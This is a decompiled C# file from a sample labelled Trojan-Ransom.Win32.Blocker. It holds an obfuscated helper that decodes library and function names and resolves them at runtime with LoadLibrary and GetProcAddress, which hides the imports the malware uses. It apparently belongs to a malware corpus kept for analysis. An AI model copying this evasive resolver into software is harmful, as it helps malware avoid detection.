// Decompiled with JetBrains decompiler
// Type: ZcVVdCANPCbBZjGTONrwNPFhxDuQUIJYETw.cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU
// Assembly: kellling, Version=6.7.1.112, Culture=neutral, PublicKeyToken=null
// MVID: 3E8DC2CE-830B-424C-A4AA-D08853C104FF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.heca-c09fdc2df41dd88ad5aed96231ac18831a58163443ae043a4b0f2290de1257ec.exe

using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security.Permissions;

namespace ZcVVdCANPCbBZjGTONrwNPFhxDuQUIJYETw
{
  public abstract class cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU
  {
    public Delegate WqDFUVfcQesRZqeRYQPXtLiVxARGQjMAmkDhkX(
      string rOaWDTYZteJwqdwboClQEkVXttptRJTIsGoKmG,
      string ugTgPOxcWcitgjEBHrDYFcaIkIBEhnjnfRmf,
      Type BDGrOQRhLlUlFeRjgbSDLrHNqqhoqLMsUQDlscm)
    {
      string JWZVcOcGSBxlUZVIurwWhbmvWaRnYbpBkGsk = CHtQZAquInpurBOFUorBmIFYXjDJiuIRkdkCOO.mdGAxAXHMvfndYCoBEjdjFaqRqZJsCiqaRD(rOaWDTYZteJwqdwboClQEkVXttptRJTIsGoKmG);
      string kgcOYTpMZVqqtpwbQXgiZuxvkgmKtBOfglHIU = CHtQZAquInpurBOFUorBmIFYXjDJiuIRkdkCOO.mdGAxAXHMvfndYCoBEjdjFaqRqZJsCiqaRD(ugTgPOxcWcitgjEBHrDYFcaIkIBEhnjnfRmf);
      cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU.SafeLibraryHandle JFvgvCWsahoYRhMCrlhcZnccRVHLKFilEIOblox = cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU.Methods.LoadLibrary(JWZVcOcGSBxlUZVIurwWhbmvWaRnYbpBkGsk);
      Delegate @delegate = (Delegate) null;
      if (!JFvgvCWsahoYRhMCrlhcZnccRVHLKFilEIOblox.IsInvalid && !JFvgvCWsahoYRhMCrlhcZnccRVHLKFilEIOblox.IsClosed)
      {
        @delegate = Marshal.GetDelegateForFunctionPointer(cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU.Methods.GetProcAddress(JFvgvCWsahoYRhMCrlhcZnccRVHLKFilEIOblox, kgcOYTpMZVqqtpwbQXgiZuxvkgmKtBOfglHIU), BDGrOQRhLlUlFeRjgbSDLrHNqqhoqLMsUQDlscm);
        JFvgvCWsahoYRhMCrlhcZnccRVHLKFilEIOblox.Close();
      }
      return @delegate;
    }

    public sealed class Methods
    {
      private const string KERNEL32 = "kernel32";

      [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
      [DllImport("kernel32", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool FreeLibrary(IntPtr JFvgvCWsahoYRhMCrlhcZnccRVHLKFilEIOblox);

      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(
        cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU.SafeLibraryHandle JFvgvCWsahoYRhMCrlhcZnccRVHLKFilEIOblox,
        string kgcOYTpMZVqqtpwbQXgiZuxvkgmKtBOfglHIU);

      [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU.SafeLibraryHandle LoadLibrary(
        string JWZVcOcGSBxlUZVIurwWhbmvWaRnYbpBkGsk);
    }

    [SecurityPermission(SecurityAction.LinkDemand, UnmanagedCode = true)]
    public sealed class SafeLibraryHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
      private SafeLibraryHandle()
        : base(true)
      {
      }

      protected override bool ReleaseHandle() => cBNTuwSqYfAGhOOhbRcmPJvbwXAXBaOmiWU.Methods.FreeLibrary(this.handle);
    }
  }
}
